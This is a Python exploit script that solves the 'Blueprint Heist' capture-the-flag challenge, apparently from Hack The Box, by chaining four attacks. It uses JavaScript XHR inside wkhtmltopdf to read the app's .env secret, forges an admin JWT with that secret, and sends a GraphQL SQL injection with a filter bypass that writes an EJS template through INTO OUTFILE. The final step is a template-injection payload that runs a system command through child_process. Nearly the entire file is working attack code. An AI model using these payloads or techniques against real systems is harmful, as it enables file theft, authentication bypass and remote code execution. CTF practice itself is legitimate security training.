#!/usr/bin/env python3
"""Blueprint Heist — wkhtmltopdf JS XHR LFI .env → admin JWT → GraphQL SQLi → EJS SSTI."""
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import io
import json
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

from pypdf import PdfReader

FLAG_RE = re.compile(r"HTB\{[^}]+\}")
SSTI = '<p><%= process.mainModule.require("child_process").execSync("/readflag") %></p>'


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def jwt_role(secret: str, role: str) -> str:
    header = b64url(b'{"alg":"HS256","typ":"JWT"}')
    payload = b64url(json.dumps({"role": role}, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url(sig)}"


def http(url: str, data: bytes | None = None, timeout: float = 80.0) -> tuple[int, bytes]:
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    if data:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def pdf_text(blob: bytes) -> str:
    if not blob.startswith(b"%PDF"):
        return blob.decode("utf-8", "replace")
    r = PdfReader(io.BytesIO(blob))
    return "\n".join((p.extract_text() or "") for p in r.pages)


def download_url(base: str, token: str, url: str) -> bytes:
    body = urllib.parse.urlencode({"url": url}).encode()
    _, blob = http(
        f"{base}/download?token={urllib.parse.quote(token, safe='')}",
        data=body,
        timeout=90.0,
    )
    return blob


def data_html(script: str) -> str:
    return "data:text/html,<script>" + script + "</script>"


def exploit(base: str, evidence: Path | None = None) -> str:
    base = base.rstrip("/")
    ev = evidence
    if ev:
        ev.mkdir(parents=True, exist_ok=True)

    _, tok = http(base + "/getToken")
    user = tok.decode("utf-8", "replace").strip()

    # 1) LFI /app/.env via wkhtmltopdf JS XHR file://
    lfi = data_html(
        "var x=new XMLHttpRequest();x.open('GET','file:///app/.env',false);"
        "x.send();document.write('<pre>'+x.responseText+'</pre>');"
    )
    env_pdf = download_url(base, user, lfi)
    env_txt = pdf_text(env_pdf)
    if ev:
        (ev / "01_env.txt").write_text(
            f"Q: XHR file:///app/.env via data HTML?\n{env_txt}\n", encoding="utf-8"
        )
    m = re.search(r"secret=([^\s]+)", env_txt)
    if not m:
        raise SystemExit(f"no secret in .env pdf: {env_txt!r}")
    secret = m.group(1).strip()
    admin = jwt_role(secret, "admin")

    # 2) GraphQL GET (wkhtmltopdf fetches 127.0.0.1 → checkInternal OK)
    #    \\n bypasses detectSqli; INTO OUTFILE writes missing 404.ejs
    name = (
        "admin\\n' union select 1,'"
        + SSTI.replace('"', '\\"')
        + "',2,3 into outfile '/app/views/errors/404.ejs'-- "
    )
    query = '{getDataByName(name:"%s"){name}}' % name
    inner = (
        "http://127.0.0.1:1337/graphql?token="
        + admin
        + "&query="
        + urllib.parse.quote(query, safe="")
    )
    sqli_pdf = download_url(base, user, inner)
    sqli_txt = pdf_text(sqli_pdf)
    if ev:
        (ev / "02_sqli.txt").write_text(
            f"Q: XHR POST GraphQL SQLi INTO OUTFILE 404.ejs?\n{sqli_txt}\n",
            encoding="utf-8",
        )

    time.sleep(0.4)
    code, page = http(base + "/this-route-does-not-exist")
    text = page.decode("utf-8", "replace")
    if ev:
        (ev / "03_ssti.txt").write_text(
            f"Q: GET 404 renders SSTI /readflag?\nstatus={code}\n{text[:600]}\n",
            encoding="utf-8",
        )
    fm = FLAG_RE.search(text)
    if not fm:
        raise SystemExit(f"no flag; sqli={sqli_txt[:300]!r} ssti={text[:300]!r}")
    return fm.group(0)


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://154.57.164.68:31206")
    p.add_argument(
        "--evidence",
        default=str(Path(__file__).resolve().parent / "evidence"),
    )
    args = p.parse_args()
    print(exploit(args.target, Path(args.evidence)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
